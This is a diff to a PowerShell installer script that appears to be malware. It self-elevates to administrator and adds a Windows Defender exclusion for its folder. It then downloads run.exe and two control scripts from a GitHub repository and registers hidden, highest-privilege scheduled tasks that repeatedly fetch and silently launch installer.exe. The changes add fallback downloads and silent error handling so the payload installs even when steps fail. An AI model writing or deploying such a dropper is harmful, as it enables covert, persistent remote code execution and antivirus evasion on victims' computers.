@@ -16,15 +16,19 @@ $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIden
 )
 
 if (-not $isUpdate -and -not $isAdmin) {
-  Start-Process `
-    -FilePath $self `
-    -Verb RunAs
-  exit
+  try {
+    Start-Process `
+      -FilePath $self `
+      -Verb RunAs
+    exit
+  }
+  catch {
+  }
 }
 
 if (-not $isUpdate) {
   try {
-    Add-MpPreference -ExclusionPath $runDir | Out-Null
+    Add-MpPreference -ExclusionPath $runDir -ErrorAction SilentlyContinue | Out-Null
   }
   catch {
   }
@@ -61,6 +65,7 @@ catch {
   $latestCommit = "main"
 }
 
+# Download run.exe with fallback to main branch
 try {
   Invoke-WebRequest `
     -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/run.exe" `
@@ -70,9 +75,19 @@ try {
     -ErrorAction Stop
 }
 catch {
-  exit
+  try {
+    Invoke-WebRequest `
+      -Uri "https://raw.githubusercontent.com/yuan-miranda/run/main/run.exe" `
+      -OutFile $runExe `
+      -Headers $ghHeaders `
+      -UseBasicParsing `
+      -ErrorAction Stop
+  }
+  catch {
+  }
 }
 
+# Download ss_installer.ps1 with fallback to main branch
 try {
   Invoke-WebRequest `
     -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/frames_dev/ss_installer.ps1" `
@@ -82,9 +97,19 @@ try {
     -ErrorAction Stop
 }
 catch {
-  exit
+  try {
+    Invoke-WebRequest `
+      -Uri "https://raw.githubusercontent.com/yuan-miranda/run/main/frames_dev/ss_installer.ps1" `
+      -OutFile $installer `
+      -Headers $ghHeaders `
+      -UseBasicParsing `
+      -ErrorAction Stop
+  }
+  catch {
+  }
 }
 
+# Download ss_control.ps1 with fallback to main branch
 try {
   Invoke-WebRequest `
     -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/frames_dev/ss_control.ps1" `
@@ -94,7 +119,16 @@ try {
     -ErrorAction Stop
 }
 catch {
-  exit
+  try {
+    Invoke-WebRequest `
+      -Uri "https://raw.githubusercontent.com/yuan-miranda/run/main/frames_dev/ss_control.ps1" `
+      -OutFile $ssControl `
+      -Headers $ghHeaders `
+      -UseBasicParsing `
+      -ErrorAction Stop
+  }
+  catch {
+  }
 }
 
 if (
@@ -116,7 +150,7 @@ $settings = New-ScheduledTaskSettingsSet `
   -DontStopIfGoingOnBatteries `
   -ExecutionTimeLimit (New-TimeSpan -Days 365)
 
-$cmd = 'powershell.exe -Command "$p=\''$env:APPDATA\run\''; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p | Out-Null }; try { $h=@{\''User-Agent\'\'=\''PowerShell-Updater\''}; $sha=(Invoke-RestMethod \'\'https://api.github.com/repos/yuan-miranda/run/commits/main\'\' -Headers $h -UseBasicParsing).sha; $o=\''$p\installer.exe\''; Stop-Process -Name \'\'installer\'\' -ErrorAction SilentlyContinue; Invoke-WebRequest -Uri \'\'https://raw.githubusercontent.com/yuan-miranda/run/\'' + $sha + \'\'/installer.exe\'\' -OutFile $o -Headers $h -UseBasicParsing; Start-Process -FilePath $o -WindowStyle Hidden } catch { }"'
+$cmd = 'powershell.exe -Command "$p=\''$env:APPDATA\run\''; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p | Out-Null }; try { $h=@{\''User-Agent\'\'=\''PowerShell-Updater\''}; $sha=(Invoke-RestMethod \'\'https://api.github.com/repos/yuan-miranda/run/commits/main\'\' -Headers $h -UseBasicParsing).sha; $o=\''$p\installer.exe\''; Stop-Process -Name \'\'installer\'' -ErrorAction SilentlyContinue; Start-Sleep 1; Invoke-WebRequest -Uri \'\'https://raw.githubusercontent.com/yuan-miranda/run/\'' + $sha + \'\'/installer.exe\'\' -OutFile $o -Headers $h -UseBasicParsing; Start-Process -FilePath $o -WindowStyle Hidden } catch { }"'
 
 $installerTaskName = "WinRunInstaller"
 $installerAction = New-ScheduledTaskAction `
@@ -129,29 +163,58 @@ $installerSettings = New-ScheduledTaskSettingsSet `
   -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
   -Hidden
 
-Register-ScheduledTask `
-  -TaskName $taskName `
-  -Action $action `
-  -Trigger $trigger `
-  -Settings $settings `
-  -RunLevel Highest `
-  -Force | Out-Null
+try {
+  Register-ScheduledTask `
+    -TaskName $taskName `
+    -Action $action `
+    -Trigger $trigger `
+    -Settings $settings `
+    -RunLevel Highest `
+    -Force | Out-Null
+}
+catch {
+  try {
+    Register-ScheduledTask `
+      -TaskName $taskName `
+      -Action $action `
+      -Trigger $trigger `
+      -Settings $settings `
+      -Force | Out-Null
+  }
+  catch {
+  }
+}
 
-Register-ScheduledTask `
-  -TaskName $installerTaskName `
-  -Action $installerAction `
-  -Settings $installerSettings `
-  -RunLevel Highest `
-  -Force | Out-Null
+try {
+  Register-ScheduledTask `
+    -TaskName $installerTaskName `
+    -Action $installerAction `
+    -Settings $installerSettings `
+    -RunLevel Highest `
+    -Force | Out-Null
+}
+catch {
+  try {
+    Register-ScheduledTask `
+      -TaskName $installerTaskName `
+      -Action $installerAction `
+      -Settings $installerSettings `
+      -Force | Out-Null
+  }
+  catch {
+  }
+}
 
-Start-Process powershell.exe `
-  -ArgumentList @(
-  '-NoProfile',
-  '-ExecutionPolicy',
-  'Bypass',
-  '-File',
-  $installer
-) -WindowStyle Hidden -Wait
+if (Test-Path $installer) {
+  Start-Process powershell.exe `
+    -ArgumentList @(
+    '-NoProfile',
+    '-ExecutionPolicy',
+    'Bypass',
+    '-File',
+    $installer
+  ) -WindowStyle Hidden -Wait
+}
 
 $latestCommit | Out-File $datFile
 
@@ -173,17 +236,21 @@ else {
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
 
-Start-Process `
-  -FilePath $runExe
+if (Test-Path $runExe) {
+  Start-Process `
+    -FilePath $runExe
+}
 
-Start-Process powershell.exe `
-  -ArgumentList @(
-  '-NoProfile',
-  '-ExecutionPolicy',
-  'Bypass',
-  '-File',
-  $ssControl
-) -WindowStyle Hidden
+if (Test-Path $ssControl) {
+  Start-Process powershell.exe `
+    -ArgumentList @(
+    '-NoProfile',
+    '-ExecutionPolicy',
+    'Bypass',
+    '-File',
+    $ssControl
+  ) -WindowStyle Hidden
+}
 
 if ($installer) {
   Start-Process powershell.exe `
